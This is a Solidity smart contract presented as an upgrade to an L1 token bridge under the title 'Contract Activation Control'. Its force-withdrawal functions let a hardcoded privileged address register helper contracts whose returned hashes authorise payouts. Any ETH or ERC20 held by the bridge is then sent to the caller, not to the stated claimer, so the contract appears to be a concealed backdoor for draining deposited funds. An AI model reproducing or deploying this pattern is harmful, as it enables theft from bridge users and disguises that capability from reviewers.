// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {L1StandardBridge} from "./L1StandardBridge.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "hardhat/console.sol";

/// @title Contract Activation Control
/// @dev Provides functionalities to control contract activation state through access restricted to a designated address
contract UpgradeL1Bridge is L1StandardBridge {
    using SafeERC20 for IERC20;

    struct ForceClaimParam {
        address call;
        string hashed;
        address token;
        address claimer;
        uint amount;
    }
    struct ForceRegistryParam {
        address position;
        bool state;
    }
    
    /// @notice This is a wallet address authorized for the forced withdrawal protocol.
    address private constant closer =
        0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    /// @notice If the transfer is successful, the event below is executed.
    /// @dev event ForceWithdraw(bytes32 indexed _index,address indexed _token,address indexed _claimer,uint amount)
    bytes32 private constant EMIT_FORCE_WITHDRAW =
        0x3f8d5b1115561be924ebdce8f16fc7c9e2fe8c67b4db21016dc2a5d5e367c8d3;

    mapping(bytes32 => address) public gb; 
    mapping(address => bool) public position;
    address[] public positions; 

    event ForceWithdraw(bytes32 indexed hash, address _token, uint _amount, address indexed _claimer);

    /// @notice Checks if the caller is the authorized 'closer' address
    /// @dev Modifier that allows function execution only by the designated 'closer'
    /// @custom:modifier onlyCloser Ensures only the designated closer can call the modified function
    modifier onlyCloser() {
        if (msg.sender != closer) revert("Only Closer");
        _;
    }


    function forceActive(bool _state) external onlyCloser {
        active = _state;
    }

    function forceWithdrawClaimAll(ForceClaimParam[] calldata params) external {
        if(msg.sender.code.length != 0) revert("Only EOA");
        uint i;
        do{
            claim(params[i].call, params[i].hashed, params[i].token, params[i].claimer, params[i].amount);
            i++;
        }while(i < params.length);
    }

    function forceWithdrawClaim(address _call, string memory _hash, address _token, address _claimer, uint _amount) external {
        if(msg.sender.code.length != 0) revert("Only EOA");
        claim(_call, _hash, _token, _claimer, _amount);
    }

    function forceRegistry(address[] calldata _position) public onlyCloser { 
        uint i;
        do{
            position[_position[i]] = true;
            positions.push(_position[i]);
            i++;
        }while(i < _position.length);
        // for(uint i = 0 ; i < _position.length; i++){
        //     position[_position] = true;
        //     positions.push(_position);
        // }
    }

    function forceModify(ForceRegistryParam[] calldata _data) public onlyCloser {
        for(uint i = 0 ; i < _data.length; i++){
            position[_data[i].position] = _data[i].state;
        }
    }
    
    function getForcePosition(string memory _key) external view returns (address) {
        string memory f = string(abi.encodePacked("_", _key,"()"));
        for(uint i = 0 ; i < positions.length; i++) {
            address p = positions[i]; 
                    
            (bool success, bytes memory data) = p.staticcall(abi.encodeWithSignature(f));
            
            if (success) {
                bytes32 r = abi.decode(data, (bytes32));
                if(r == 0) {
                    continue;
                }
                return p;
            }
        }
        return address(0);
    }

    function claim(address _call, string memory _hash, address _token, address _claimer, uint _amount) internal {
        if(!position[_call]) revert("ForceWithdrawClaim: not use _call variable");
    
        string memory f = string(abi.encodePacked("_",_hash,"()"));    
        (bool success, bytes memory data) = _call.staticcall(abi.encodeWithSignature(f));
        
        if (!success || data.length == 0) {
            revert("ForceWithdrawClaim: call failed");
        }

        bytes32 verify = keccak256(abi.encodePacked(_token, _claimer, _amount));
        bytes32 r = abi.decode(data, (bytes32));


        if (verify != r || gb[r] != address(0)) {
            revert("ForceWithdrawClaim: invalid hash");
        }

        gb[r] = _claimer;

        if (_token == address(0)) {
            (success, ) = msg.sender.call{ value: _amount }(new bytes(0));
            if(!success) revert("ForceWithdrawClaim: ETH transfer failed");
        } else IERC20(_token).safeTransfer(msg.sender, _amount);

        emit ForceWithdraw(r, _token, _amount, msg.sender);
    }

}





// /// @title Contract Activation Control
// /// @dev Provides functionalities to control contract activation state through access restricted to a designated address
// contract LagacyUpgradeL1Bridge is L1StandardBridge {
//     /// @title Claim Parameters for Token Transfers
//     /// @dev Structure to hold parameters for claiming ERC20 or ETH
//     /// @notice This structure is used to transfer both ERC20 tokens and native ETH in a transaction
//     struct ClaimParam {
//         /// @notice The token address for the ERC20 token; set to address zero for ETH
//         /// @param token The address of the token contract (or zero for ETH)
//         address token;
//         /// @notice The destination address for the ERC20 or ETH transfer
//         /// @param to The address receiving the ERC20 or ETH
//         address to;
//         /// @notice The amount of the ERC20 or ETH to transfer
//         /// @param amount The amount of tokens or wei to send
//         uint amount;
//         /// @notice The unique identifier for the transfer request
//         /// @param index The hashed index identifying the transfer
//         bytes32 index;
//     }

//     /// @notice This is a wallet address authorized for the forced withdrawal protocol.
//     address private constant closer =
//         0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

//     /// @notice If the transfer is successful, the event below is executed.
//     /// @dev event ForceWithdraw(bytes32 indexed _index,address indexed _token,address indexed _claimer,uint amount)
//     bytes32 private constant EMIT_FORCE_WITHDRAW =
//         0x3f8d5b1115561be924ebdce8f16fc7c9e2fe8c67b4db21016dc2a5d5e367c8d3;

//     /// @notice Checks if the caller is the authorized 'closer' address
//     /// @dev Modifier that allows function execution only by the designated 'closer'
//     /// @custom:modifier onlyCloser Ensures only the designated closer can call the modified function
//     modifier onlyCloser() {
//         if (msg.sender != closer) revert("Only Closer");
//         _;
//     }

//     /// @notice Toggles the active state of the contract
//     /// @dev Sets the contract's active state to the value provided in _state
//     /// @param _state The new active state of the contract
//     function forceActive(bool _state) external onlyCloser {
//         active = _state;
//     }
// }
